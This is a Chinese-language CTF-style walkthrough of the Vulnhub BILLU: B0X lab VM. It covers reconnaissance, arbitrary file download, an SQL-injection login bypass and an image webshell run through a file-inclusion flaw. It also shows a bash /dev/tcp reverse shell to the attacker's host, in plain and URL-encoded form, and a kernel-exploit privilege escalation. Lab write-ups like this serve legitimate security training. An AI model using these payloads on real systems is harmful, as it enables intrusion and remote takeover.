BILLU: B0X是Vulnhub上的一个靶场，难度为medium。

下载地址为 <https://www.vulnhub.com/entry/billu-b0x,188/>

## 一、信息收集

先用nmap扫一下ip。

![](https://image.3001.net/images/20221229/1672323036_63ad9fdc5dd08d64bf518.png!small)

锁定靶机ip为192.168.250.131，接下来扫一扫端口和系统。

![](https://image.3001.net/images/20221229/1672323058_63ad9ff22af50ce824766.png!small)![](https://image.3001.net/images/20221229/1672323069_63ad9ffd115bd7b261783.png!small)

可以得到靶机开放了22和80端口，使用的是Apache2.2.22和Ubuntu，内核是Linux3.2-4.9。

接下来用御剑暴破下目录。

![](https://image.3001.net/images/20221229/1672323079_63ada007a8cbc1caeb14e.png!small)从暴破结果可以发现其使用的是php。

## 二、漏洞挖掘

打开192.168.250.131，出现如下页面。

![](https://image.3001.net/images/20221229/1672323114_63ada02ab3b16c3c76367.png!small)既然其告诉了我们“Show
me your SQLI skills”，那就先用admin'or 1=1 # 尝试一下，发现报错。

![](https://image.3001.net/images/20221229/1672323148_63ada04c0ad6d28f9b702.png!small)

因为我们还有很多其他的暴破出的目录没有看，所以简单尝试失败后就先暂时不考虑这个sql注入的问题，毕竟有可能是靶机作者故意写一段话让我们浪费时间的。

接下来尝试访问后台目录。

首先先尝试第一个test.php，点击进去之后提示“'file' parameter is empty. Please provide file path
in 'file' parameter”，这表明该页面需要一个file的数据，那我们就给它一个文件路径试一下。

考虑到传参方式可能为GET也可能为POST，所以我们两个都要试一下。

用HackBar进行GET请求“http://192.168.250.131/test.php?file=/etc/passwd”，发现并没有反应。

继续使用POST请求，发现文件被成功下载下来了。

![](https://image.3001.net/images/20221229/1672323158_63ada056eaec06cc686be.png!small)![](https://image.3001.net/images/20221229/1672323164_63ada05cc52f99af2a83f.png!small)这样就为我们打开了一个突破口。接下来我们就可以将后台文件全部下载下来并进行代码审计工作，看看能不能从中发现些重要信息。

![](https://image.3001.net/images/20221229/1672323179_63ada06b3c17bb2a42a5c.png!small)

这里我主要发现了三个重要的文件。

1、in.php

    
    
    <?php 
    phpinfo();
    ?>

当我们访问http://192.168.250.131/in.php的时候，可以直接打开phpinfo()。

2、c.php

    
    
    <?php
    #header( 'Z-Powered-By:its chutiyapa xD' );
    header('X-Frame-Options: SAMEORIGIN');
    header( 'Server:testing only' );
    header( 'X-Powered-By:testing only' );
    
    ini_set( 'session.cookie_httponly', 1 );
    
    $conn = mysqli_connect("127.0.0.1","billu","b0x_billu","ica_lab");
    
    // Check connection
    if (mysqli_connect_errno())
      {
      echo "connection failed ->  " . mysqli_connect_error();
      }
    ?>

这是数据库连接文件，里边包含了数据库账号密码和库名（"billu","b0x_billu","ica_lab"）。

3、index.php

这个文件是我们刚刚打开的登陆首页，里面有一段代码。

    
    
    if(isset($_POST['login']))
    {
    	$uname=str_replace('\'','',urldecode($_POST['un']));
    	$pass=str_replace('\'','',urldecode($_POST['ps']));
    	$run='select * from auth where  pass=\''.$pass.'\' and uname=\''.$uname.'\'';
    	$result = mysqli_query($conn, $run);
    }

这里给了我们SQL注入的提示。

除此之外，我们还获得了其他没有扫描出来的文件信息，如head2.php，这些文件同样可以下载下来看一看。

关于phpinfo中的信息我们可以稍作留意，接下来主要是根据获得的信息分别尝试SQL注入和登录数据库。

1、SQL注入

首先先查看SQL语句'select * from auth where pass=\''.$pass.'\' and
uname=\''.$uname.'\''，我们把转义以及用来连接的.整理一下，实际上的SQL语句就是select * from auth where
pass='$pass' and uname='$uname'。

因此我们可以构造name为or 1=1#，password为\，这样子SQL语句就变为了select * from auth where pass='\'
and uname='or 1=1#'，也就完成了登录绕过。

注意，在这里作者有一个小变化。通常情况下我们是将user放在前，password放在后的，但是作者进行了调换。如果我们进行黑盒测试并且猜到了可能过滤了单引号，使用name=\，password=or
1=1#这样的方式尝试绕过，也会被阻挡。

这也给了我们一个提示，进行SQL注入黑盒测试的时候可以把用户名和密码调换过来试一试。

2、数据库

除了尝试SQL注入，我们也可以看一下数据库的内容，从中找到用户名密码。但是御剑暴破出的后台路径并没有和数据库相关的目录，因此我们还可以使用dirb的big.txt字典继续暴破一下。

![](https://image.3001.net/images/20221229/1672323343_63ada10f9bf6b429b1520.png!small)最终成功找到了phpmy这个目录，打开之后使用之前获取到的用户名和密码完成登录。

![](https://image.3001.net/images/20221229/1672323357_63ada11d49f25dbe2b7b8.png!small)最终成功的从auth表中获取到了登陆的用户名和密码。

![](https://image.3001.net/images/20221229/1672323372_63ada12c97ee326d9323c.png!small)

## 三、反弹Shell

成功登录后，我们发现该Web系统提供了两个功能，一个是列出所用用户，另外一个添加新用户并且上传头像。看到上传图片功能我们就应该想到可能存在文件上传漏洞。与此同时，由于我们下载了对应的文件，因此可以先审计一下上传的规则，具体的文件是panel.php。

    
    
    if(!empty($_FILES['image']['name']))
    	{
    		$iname=mysqli_real_escape_string($conn,$_FILES['image']['name']);
    	$r=pathinfo($_FILES['image']['name'],PATHINFO_EXTENSION);
    	$image=array('jpeg','jpg','gif','png');
    	if(in_array($r,$image))
    	{
    		$finfo = @new finfo(FILEINFO_MIME); 
    	$filetype = @$finfo->file($_FILES['image']['tmp_name']);
    		if(preg_match('/image\/jpeg/',$filetype )  || preg_match('/image\/png/',$filetype ) || preg_match('/image\/gif/',$filetype ))
    				{
    					if (move_uploaded_file($_FILES['image']['tmp_name'], 'uploaded_images/'.$_FILES['image']['name']))
    							 {
    							  echo "Uploaded successfully ";
    							  $update='insert into users(name,address,image,id) values(\''.$name.'\',\''.$address.'\',\''.$iname.'\', \''.$id.'\')'; 
    							 mysqli_query($conn, $update);
    							  
    							}
    				}
    			else
    			{
    				echo "<br>i told you dear, only png,jpg and gif file are allowed";
    			}
    	}
    
    
    if(isset($_POST['continue']))
    {
    	$dir=getcwd();
    	$choice=str_replace('./','',$_POST['load']);
    	
    	if($choice==='add')
    	{
           		include($dir.'/'.$choice.'.php');
    			die();
    	}
    	
            if($choice==='show')
    	{
            
    		include($dir.'/'.$choice.'.php');
    		die();
    	}
    	else
    	{
    		include($dir.'/'.$_POST['load']);
    	}
    	
    }

上述两段代码分别描述了文件上传和文件包含两个内容。可以看到文件上传时会对文件后缀和文件类型分别进行判断，此时我们可以利用图片木马的方式进行绕过。与此同时，panel.php还有文件包含漏洞，这也是我们可以利用的。

先做一个图片马上传试试看。

上传成功。

![](https://image.3001.net/images/20221229/1672323469_63ada18d9bf21dd297553.png!small)![](https://image.3001.net/images/20221229/1672323481_63ada1991c2d0b1b45abe.png!small)接下来我们就要利用文件包含漏洞了，还是根据刚刚的代码，我们可以看到首先其对continue进行了判断是否为空，然后对load进行了./的过滤，这也就意味着我们最好不要使用相对路径。分析完这些，我们就可以使用hackbar传个值试一下，例如“load=uploaded_images/muma.gif&continue=continue&try=phpinfo();”

![](https://image.3001.net/images/20221229/1672323515_63ada1bb130c64f215a62.png!small)

可以看到，图片码运行的很好。接下来我们就可以使用多种方法去获得shell并反弹了。

这里，我首先选择的是通过命令echo "bash -i >& /dev/tcp/192.168.250.128/8888 0>&1" |
bash来反弹shell。

开启nc的监听，然后通过try=system('echo%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.250.128%2F8888%200%3E%261%22%20%7C%20bash');来反弹shell，需要注意的是命令echo
"bash -i >& /dev/tcp/192.168.250.128/8888 0>&1" |
bash需要进行url编码，否则里边的双引号可能会导致命令运行不成功。

![](https://image.3001.net/images/20221229/1672323564_63ada1ecddb366e1bfaa0.png!small)

如此操作我们就成功的反弹了shell。

## 四、提升权限

可以看到我们目前是一个普通用户，即使获取了shell仍然需要进行提权操作。

由于当前的shell并不是很方便我们的后续操作，因此我们可以写入一个蚁剑的木马，使用蚁剑进行连接。

对于提权的方式，因为靶机的操作系统比较老，存在的漏洞可能会更多，因此我选择的是查找内核和操作系统是否存在提权漏洞可以完成权限提升。

![](https://image.3001.net/images/20221229/1672323598_63ada20e096f0ec5b0b60.png!small)![](https://image.3001.net/images/20221229/1672323607_63ada2170c0289f91cbd9.png!small)

根据对应的ubuntu版本，我们找到了不少可利用的漏洞。

先试试第一个37292.c。

![](https://image.3001.net/images/20221229/1672323619_63ada2237c67469f15703.png!small)成功完成提权。

  

  

  

